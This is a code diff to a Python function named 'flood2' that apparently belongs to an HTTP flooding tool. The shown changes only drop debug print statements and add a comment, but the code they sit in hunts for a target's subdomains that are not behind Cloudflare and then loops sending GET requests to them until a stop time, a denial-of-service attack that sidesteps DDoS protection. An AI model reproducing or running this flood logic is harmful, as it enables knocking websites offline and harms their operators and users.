@@ -64,10 +64,8 @@ def flood2(attack_id, url, stoptime) -> None:
             for subdomain in subdomains:
                 try:
                     host = f'{subdomain}.{urlparse(url).netloc}'
-                    print(f'--> {host}')
 
                     if not utils().is_cloudflare_ip(socket.gethostbyname(host)):
-                        print(f'Hit --> {host}')
                         # subdomain isn't protected by cloudflare!
                         unprotected.append(host)
                 
@@ -76,7 +74,6 @@ def flood2(attack_id, url, stoptime) -> None:
             
             Core.cf_check_done = True
     else:
-        print('other thread is already working')
         while not Core.cf_check_busy: 
             # while another thread is still working on hunting for unprotected subdomains
             # we wait
@@ -86,7 +83,7 @@ def flood2(attack_id, url, stoptime) -> None:
 
     # check if we have any unprotected subdomains
     if len(unprotected) == 0:
-        return
+        return # if not, just stop
 
     while time.time() < stoptime and not Core.killattack:
         if not Core.attackrunning:
@@ -95,7 +92,6 @@ def flood2(attack_id, url, stoptime) -> None:
         for hostname in unprotected:
 
             url = f'http://{hostname}'
-
             try:
                 Core.session.get(
                     utils().buildblock(url), 
